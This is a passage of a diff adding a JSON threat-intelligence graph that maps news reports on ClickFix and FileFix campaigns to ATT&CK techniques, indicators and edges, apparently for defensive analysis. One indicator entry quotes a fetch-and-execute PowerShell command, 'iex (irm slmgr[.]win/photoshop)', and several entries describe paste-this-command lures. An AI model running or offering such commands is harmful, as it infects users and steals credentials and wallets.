+                "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said.",
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script.",
+                "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware.",
+                "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+              ]
+            ]
+          },
+          "TTP:T1105_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                12,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This is not the first time FileFix has been used in attacks, with the Interlock ransomware gang previously using FileFix to install its remote access trojan (RAT)."
+              ],
+              [
+                "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1110",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1110",
+        "ttp_id": "T1110",
+        "best_span_sentences_list": [
+          [
+            "A FileFix campaign was disguised as Facebook security alerts claiming users’ accounts were at risk of suspension."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            35,
+            35
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1110_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                35,
+                35
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A FileFix campaign was disguised as Facebook security alerts claiming users’ accounts were at risk of suspension."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1176",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1176",
+        "ttp_id": "T1176",
+        "best_span_sentences_list": [
+          [
+            "According to Microsoft’s analysis, attackers distribute a malicious Chrome extension masquerading as a legitimate ad blocker."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            45,
+            45
+          ]
+        ],
+        "edges": [
+          "EDGE_2de65a6c493a",
+          "EDGE_41224f39f46d"
+        ],
+        "source": {
+          "TTP:T1176_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                45,
+                45
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "According to Microsoft’s analysis, attackers distribute a malicious Chrome extension masquerading as a legitimate ad blocker."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "ClickFix sidesteps both by convincing users to execute commands themselves, transforming a cautious habit into an exploitable behavior.",
+            "When users follow the “fix” instructions and paste it into their Run, Terminal, or PowerShell window, they unknowingly execute the attacker’s code."
+          ],
+          [
+            "ClickFix also affects users across operating systems.",
+            "While it began on Windows, attackers have adapted lures for macOS.",
+            "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+          ],
+          [
+            "When users followed instructions to paste copied text into the Run command, the injected PowerShell script installed the Interlock RAT."
+          ],
+          [
+            "The fake alert instructed victims to paste a path into File Explorer – in reality, a disguised PowerShell command."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            6
+          ],
+          [
+            8,
+            10
+          ],
+          [
+            33,
+            33
+          ],
+          [
+            36,
+            36
+          ]
+        ],
+        "edges": [
+          "EDGE_5641ce26a10e",
+          "EDGE_86df8f4af142",
+          "EDGE_8eda8fb1b0fd",
+          "EDGE_2ddf7213b853",
+          "EDGE_580af8f540cf",
+          "EDGE_493e1f6edd00",
+          "EDGE_5c80a811f00e",
+          "EDGE_85f03ccca4ab",
+          "EDGE_cc453af7e1de",
+          "EDGE_585d8d9e5785__3767599d"
+        ],
+        "source": {
+          "TTP:T1204_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                5,
+                6
+              ],
+              [
+                8,
+                10
+              ],
+              [
+                33,
+                33
+              ],
+              [
+                36,
+                36
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "ClickFix sidesteps both by convincing users to execute commands themselves, transforming a cautious habit into an exploitable behavior.",
+                "When users follow the “fix” instructions and paste it into their Run, Terminal, or PowerShell window, they unknowingly execute the attacker’s code."
+              ],
+              [
+                "ClickFix also affects users across operating systems.",
+                "While it began on Windows, attackers have adapted lures for macOS.",
+                "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS)."
+              ],
+              [
+                "When users followed instructions to paste copied text into the Run command, the injected PowerShell script installed the Interlock RAT."
+              ],
+              [
+                "The fake alert instructed victims to paste a path into File Explorer – in reality, a disguised PowerShell command."
+              ]
+            ]
+          },
+          "TTP:T1204_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                5,
+                5
+              ],
+              [
+                13,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Instead, it leverages a web browser's file upload feature to deceive users into copying and pasting a command on the File Explorer's address bar, causing it to be executed locally on the victim's machine."
+              ],
+              [
+                "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said.",
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script.",
+                "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware.",
+                "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+              ]
+            ]
+          },
+          "TTP:T1204_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                0,
+                2
+              ],
+              [
+                5,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A newly discovered FileFix social engineering attack impersonates Meta account suspension warnings to trick users into unknowingly installing the StealC infostealer malware.",
+                "FileFix is a new variant of the ClickFix family of attacks, which uses social engineering attacks to trick users into pasting malicious commands into operating system dialog boxes as supposed \"fixes\" for problems.",
+                "The FileFix technique was created by red team researcher mr.d0x, and instead of convincing users into pasting malicious PowerShell commands into the Windows Run dialog or terminal, FileFix abuses the address bar in File Explorer to execute the commands."
+              ],
+              [
+                "The new campaign, discovered by Acronis, uses a multi-language phishing page that poses as Meta's support team, warning recipients that their account will be disabled in seven days unless they view an \"incident report\" allegedly shared by Meta.",
+                "However, this report is not actually a document, but a disguised PowerShell command used to install malware on targets' devices.",
+                "The phishing page tells users to click the \"Copy\" button to copy what appears to be a file path, click on the open File Explorer button, and then paste the path into the File Explorer address bar to open the document.",
+                "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer.",
+                "\"In order to trick the user into thinking that they are pasting the path to an 'incident report' PDF file, the attacker has placed a variable at the end of the payload, which contains a lot of spaces and the fake path at the end,\" explains Acronis.",
+                "\"This is done so that only the file path would appear in the address bar, and none of the actual malicious commands."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1219",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1219",
+        "ttp_id": "T1219",
+        "best_span_sentences_list": [
+          [
+            "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            19
+          ]
+        ],
+        "edges": [
+          "EDGE_ed231a5f7cec"
+        ],
+        "source": {
+          "TTP:T1219_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                19,
+                19
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- Observed final payloads include infostealers (Lumma, Aura), loaders (Latrodectus, MintsLoader), RATs (NetSupport, WebSocket RATs), and rootkits (r77 variants)."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "edges": [
+          "EDGE_5f939d7a6656",
+          "EDGE_65d5334f5ad1"
+        ],
+        "source": {
+          "TTP:T1547_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                47,
+                47
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "On domain-joined systems, the infection chain escalates by deploying a portable WinPython environment and a Python-based RAT (referred to as ModeloRAT), which establishes persistence via registry Run keys and scheduled tasks, and communicates with C2 infrastructure over HTTP."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "ClickFix also affects users across operating systems.",
+            "While it began on Windows, attackers have adapted lures for macOS.",
+            "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS).",
+            "ClickFix attacks can reach victims through a variety of vectors.",
+            "Common delivery paths include spearphishing emails with HTML attachments or links, malvertising on high-traffic sites, SEO-poisoned search results that rank malicious pages for popular queries, compromised legitimate websites, and spammed social media posts or short-form videos."
+          ],
+          [
+            "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF.",
+            "Victims received fake Zoom invitations leading to sites that displayed a bogus CAPTCHA."
+          ],
+          [
+            "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+          ],
+          [
+            "A FileFix campaign was disguised as Facebook security alerts claiming users’ accounts were at risk of suspension."
+          ],
+          [
+            "In early February 2026, Microsoft published new research on a ClickFix evolution dubbed CrashFix, which combines browser disruption with social engineering to increase execution success."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            8,
+            12
+          ],
+          [
+            25,
+            26
+          ],
+          [
+            29,
+            29
+          ],
+          [
+            35,
+            35
+          ],
+          [
+            44,
+            44
+          ]
+        ],
+        "edges": [
+          "EDGE_110c69729e41",
+          "EDGE_1fe156c439a3",
+          "EDGE_235e3e47236e",
+          "EDGE_67f2ee8dd6f1",
+          "EDGE_287300b46ec8",
+          "EDGE_6a44163a2a9f",
+          "EDGE_a9438c5ed178",
+          "EDGE_8b39c4d60f27"
+        ],
+        "source": {
+          "TTP:T1566_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": {
+            "best_span_ranges": [
+              [
+                8,
+                12
+              ],
+              [
+                25,
+                26
+              ],
+              [
+                29,
+                29
+              ],
+              [
+                35,
+                35
+              ],
+              [
+                44,
+                44
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "ClickFix also affects users across operating systems.",
+                "While it began on Windows, attackers have adapted lures for macOS.",
+                "For example, a 2025 campaign impersonated Spectrum, a telecom provider in the U.S., tricking macOS users to distribute Atomic macOS Stealer (AMOS).",
+                "ClickFix attacks can reach victims through a variety of vectors.",
+                "Common delivery paths include spearphishing emails with HTML attachments or links, malvertising on high-traffic sites, SEO-poisoned search results that rank malicious pages for popular queries, compromised legitimate websites, and spammed social media posts or short-form videos."
+              ],
+              [
+                "Researchers uncovered PhantomCaptcha, a spearphishing operation that targeted Ukrainian government agencies and NGOs including the Red Cross and UNICEF.",
+                "Victims received fake Zoom invitations leading to sites that displayed a bogus CAPTCHA."
+              ],
+              [
+                "A viral ClickFix campaign spread through TikTok videos pretended to offer activation commands for Windows, Microsoft 365, Photoshop, and even fake Spotify Premium."
+              ],
+              [
+                "A FileFix campaign was disguised as Facebook security alerts claiming users’ accounts were at risk of suspension."
+              ],
+              [
+                "In early February 2026, Microsoft published new research on a ClickFix evolution dubbed CrashFix, which combines browser disruption with social engineering to increase execution success."
+              ]
+            ]
+          },
+          "TTP:T1566_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                6,
+                10
+              ],
+              [
+                14,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "\"The observed campaign uses a highly convincing, multilingual phishing site (e.g., fake Facebook Security page), with anti-analysis techniques and advanced obfuscation to evade detection,\" Acronis security researcher Eliad Kimhy said in a report shared with The Hacker News."
+              ],
+              [
+                "The attack commences with a phishing site to which the victim is likely redirected from an email message that warns recipients of potential suspension of their Facebook accounts after a week, claiming the shared posts or messages violate its policies.",
+                "Users are then asked to appeal the decision by clicking on a button.",
+                "The phishing page is not only heavily obfuscated, but also resorts to techniques like junk code and fragmentation to hinder analysis efforts.",
+                "The FileFix attack comes into play once the button is clicked, at which point the victim is displayed a message stating they can access a PDF version of the supposed policy violation by copying and pasting a path to the document in the File Explorer's address bar.",
+                "While the path provided in the instruction appears completely harmless, clicking the \"Copy\" button actually copies a malicious command that's suffixed with extra spaces, so that only the file path is displayed when pasted into File Explorer upon opening it using the \"Open File Explorer\" button."
+              ],
+              [
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+              ]
+            ]
+          },
+          "TTP:T1566_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ],
+              [
+                5,
+                10
+              ],
+              [
+                13,
+                13
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "A newly discovered FileFix social engineering attack impersonates Meta account suspension warnings to trick users into unknowingly installing the StealC infostealer malware."
+              ],
+              [
+                "The new campaign, discovered by Acronis, uses a multi-language phishing page that poses as Meta's support team, warning recipients that their account will be disabled in seven days unless they view an \"incident report\" allegedly shared by Meta.",
+                "However, this report is not actually a document, but a disguised PowerShell command used to install malware on targets' devices.",
+                "The phishing page tells users to click the \"Copy\" button to copy what appears to be a file path, click on the open File Explorer button, and then paste the path into the File Explorer address bar to open the document.",
+                "However, clicking the Copy button actually copies a PowerShell command with added spaces into the Windows clipboard, so that only the file path is shown when pasted into File Explorer.",
+                "\"In order to trick the user into thinking that they are pasting the path to an 'incident report' PDF file, the attacker has placed a variable at the end of the payload, which contains a lot of spaces and the fake path at the end,\" explains Acronis.",
+                "\"This is done so that only the file path would appear in the address bar, and none of the actual malicious commands."
+              ],
+              [
+                "Acronis reports that multiple variants of this campaign were observed over two weeks, using different payloads, domains, and lures."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1082",
+        "ttp_id": "T1082",
+        "best_span_sentences_list": [
+          [
+            "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said.",
+            "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script.",
+            "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            15
+          ]
+        ],
+        "edges": [],
+        "source": {
+          "TTP:T1082_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                13,
+                15
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "\"On the other hand, one of the things that makes ClickFix so challenging to detect in the first place is that it is spawned from Explorer.exe via the run dialog, or directly from a terminal, whereas with FileFix, the payload is executed by the web browser used by the victim, which is far more likely to stand out in an investigation or to a security product,\" Acronis said.",
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script.",
+                "The script is designed to profile the compromised host and deliver additional payloads, including AnyDesk, TeamViewer, information stealers, and clipper malware."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1115",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1115",
+        "ttp_id": "T1115",
+        "best_span_sentences_list": [
+          [
+            "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ]
+        ],
+        "edges": [
+          "EDGE_725ee8f9b421"
+        ],
+        "source": {
+          "TTP:T1115_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                14,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "\"The adversary behind this attack demonstrated significant investment in tradecraft, carefully engineering the phishing infrastructure, payload delivery and supporting elements to maximize both evasion and impact.\"\nThe disclosure comes as Doppel detailed another campaign that has been observed using a combination of fake support portals, Cloudflare CAPTCHA error pages, and clipboard hijacking -- i.e., ClickFix -- to socially engineer victims into running malicious PowerShell code that downloads and runs an AutoHotkey (AHK) script."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1218",
+        "ttp_id": "T1218",
+        "best_span_sentences_list": [
+          [
+            "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            16,
+            16
+          ]
+        ],
+        "edges": [
+          "EDGE_3c804ff82e3c",
+          "EDGE_91547a18dfe8"
+        ],
+        "source": {
+          "TTP:T1218_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": {
+            "best_span_ranges": [
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1140",
+        "ttp_id": "T1140",
+        "best_span_sentences_list": [
+          [
+            "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            12,
+            12
+          ]
+        ],
+        "edges": [
+          "EDGE_63cbac443576"
+        ],
+        "source": {
+          "TTP:T1140_www.bleepingcomputer.com_news_security_new-filefix-attack-uses-steganography-to-drop-stealc-malware": {
+            "best_span_ranges": [
+              [
+                12,
+                12
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The first-stage PowerShell command, unknowingly entered by the target, first downloads the image, extracts the embedded secondary script, which is then used to decrypt the payloads in memory."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_3b38f5104ba9",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "slmgr[.]win",
+        "edges": [
+          "EDGE_3926783d4916",
+          "EDGE_c2ed7cc2ae20"
+        ],
+        "source": {
+          "slmgr[.]win_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              30,
+              "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+            ]
+          ]
+        },
+        "raw_value": "slmgr[.]win",
+        "canonical_value": "slmgr.win",
+        "normalized_value": "slmgr.win"
+      },
+      {
+        "node_id": "IOC_e651584137fe",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "slmgr[.]win/photoshop",
+        "edges": [
+          "EDGE_415dacec3bad",
+          "EDGE_a3e38363735e"
+        ],
+        "source": {
+          "slmgr[.]win/photoshop_ClickFix & FileFix_ How a Copy-Paste Trick Became 2025’s Top Social Engineering Threat": [
+            [
+              30,
+              "The videos instructed users to run commands such as: iex (irm slmgr[.]win/photoshop)\nWhen executed, the command downloaded the Aura Stealer, which harvested browser credentials and crypto wallets."
+            ]
+          ]
+        },
+        "raw_value": "slmgr[.]win/photoshop",
+        "canonical_value": "slmgr.win/photoshop",
+        "normalized_value": "slmgr.win/photoshop"
+      },
+      {
+        "node_id": "IOC_ceb009fa7946",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "wl.google-587262[.]com",
+        "edges": [
+          "EDGE_0988a923a256",
+          "EDGE_91547a18dfe8",
+          "EDGE_f26944381037"
+        ],
+        "source": {
+          "wl.google-587262[.]com_thehackernews.com_2025_09_new-filefix-variant-delivers-stealc.html": [
+            [
+              16,
+              "The cybersecurity company said it also observed other variants of the activity where victims are guided to run an MSHTA command pointing to a lookalike Google domain (\"wl.google-587262[.]com\"), which then retrieves and executes a remote malicious script."
+            ]
+          ]
+        },
+        "raw_value": "wl.google-587262[.]com",
+        "canonical_value": "wl.google-587262.com",
+        "normalized_value": "wl.google-587262.com"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_042c6a1c2f2b",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_04930fc18d9e",
+      "node_u": "HL_5fb6d8e856e0",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_071e020f9234",
+      "node_u": "HL_c5f16d4cfd6c",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_110c69729e41",
+      "node_u": "HL_2fa87035e3b8",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_11aaaa1d3f34",
+      "node_u": "HL_428fc2608140",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1a204ed603fe",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1dd54a53add6",
+      "node_u": "HL_274adb6e9380",
+      "node_v": "TTP_T1014",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1f116259609e",
+      "node_u": "HL_c0511d4808e2",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1fe156c439a3",
+      "node_u": "HL_8adbaf31fb92",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_235e3e47236e",
+      "node_u": "HL_77b792a2ed60",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_25387f639307",
+      "node_u": "HL_77b792a2ed60",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2de65a6c493a",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1176",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2e25f714f4b2",
+      "node_u": "HL_77b792a2ed60",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3191a370f999",
+      "node_u": "HL_0016d7882d5f",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3926783d4916",
+      "node_u": "IOC_3b38f5104ba9",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3d4dc7d99b13",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_41224f39f46d",
+      "node_u": "HL_fde5e6472d67",
+      "node_v": "TTP_T1176",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_415dacec3bad",
+      "node_u": "IOC_e651584137fe",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_450848c5a7e3",
+      "node_u": "HL_6f65f0e48abe",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4c6429021270",
+      "node_u": "HL_c5f16d4cfd6c",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5641ce26a10e",
+      "node_u": "HL_5fb6d8e856e0",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_57a79c091289",
+      "node_u": "HL_1a612db4ac86",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5d1cbdc3203c",
+      "node_u": "HL_c0511d4808e2",
+      "node_v": "TTP_T1053",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5f939d7a6656",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_65d5334f5ad1",
+      "node_u": "HL_c0511d4808e2",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_66ae7a784c7b",
+      "node_u": "HL_77b792a2ed60",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_67f2ee8dd6f1",
+      "node_u": "HL_5100a6ad379b",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_86df8f4af142",
+      "node_u": "HL_428fc2608140",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8cf03ee92f40",
+      "node_u": "HL_fde5e6472d67",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8e24cfdfe53d",
+      "node_u": "HL_c0511d4808e2",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8eda8fb1b0fd",
+      "node_u": "HL_77b792a2ed60",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_9aebf9efad1a",
+      "node_u": "HL_c458c0a70a9d",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a3e38363735e",
+      "node_u": "IOC_e651584137fe",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_b1dd59f20743",
